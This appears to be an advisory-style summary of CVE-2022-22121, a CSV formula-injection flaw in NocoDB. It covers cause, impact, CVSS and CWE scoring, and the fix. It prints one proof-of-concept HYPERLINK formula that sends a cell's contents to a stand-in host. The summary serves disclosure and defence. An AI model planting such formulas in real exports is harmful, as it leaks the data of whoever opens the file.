Based on the provided content, here's a breakdown of the vulnerability information related to CVE-2022-22121:

**Root Cause of Vulnerability:**

*   The vulnerability stems from NocoDB's failure to properly sanitize user-controlled input when generating CSV files. Specifically, the application does not neutralize special characters, like formula syntax, in user-provided data before including them in a CSV export.

**Weaknesses/Vulnerabilities Present:**

*   **CSV Injection (Formula Injection):** The core issue is a CSV injection vulnerability, also known as formula injection. This occurs because the application uses user-supplied data directly in the CSV file without proper escaping or sanitization, allowing formulas to be injected.

*   **Improper Neutralization:** The software fails to neutralize special elements in output used by a downstream component, leading to the possibility of malicious code execution.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** When an unsuspecting user (e.g., an administrator) opens the crafted CSV file in a spreadsheet application (like Microsoft Excel or Google Sheets), the injected formulas can execute malicious code. This could lead to various impacts like data exfiltration, privilege escalation (if the user has elevated privileges), and other attacks on the user's system.
*   **Confidentiality, Integrity, and Availability:**  The vulnerability has a high impact on Confidentiality, Integrity and Availability of the system

**Attack Vectors:**

*   **Network:** The attack vector is network-based.
*   **Low Privileged Users:** A low-privileged user (e.g., an "editor" role) can create a new table and insert malicious content in the table rows.

**Required Attacker Capabilities/Position:**

*   **Low Privileges:** The attacker needs to have low privileges like editor in the NocoDB application to create and insert malicious data.
*   **User Interaction:** The exploitation requires user interaction in the form of an administrator downloading and opening the crafted CSV file using spreadsheet application

**Technical Details:**

*   **Affected versions:** NocoDB versions 0.81.0 through 0.83.8 are affected.
*   **Proof of Concept (PoC) Code:** A sample payload is `=HYPERLINK("http://0.0.0.0:8000/?leak="&A1,"click")`. This formula, when opened in a spreadsheet application, attempts to make a network connection to a specified IP, potentially leaking the data in cell A1.
*   **Fix:** The fix involves updating NocoDB to version 0.84.0 or later, where sanitization of user data was added before generating CSV files. The specific code change involved adding `escapeFormulae: true` option to the `Papaparse.unparse` call.

**CWE Classification:**

*   **CWE-74:** Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
*   **CWE-1236:** Improper Neutralization of Formula Elements in a CSV File

**CVSS Scores:**

*   **CVSS v3.1:** Base Score of 8.0 (Network attack vector, Low attack complexity, Low privileges required, User interaction required, High Confidentiality, Integrity, and Availability)
*   **CVSS v2:** Base Score of 6.0 (Network Access Vector, Medium Access Complexity, Single Authentication, Partial Confidentiality, Integrity, and Availability)
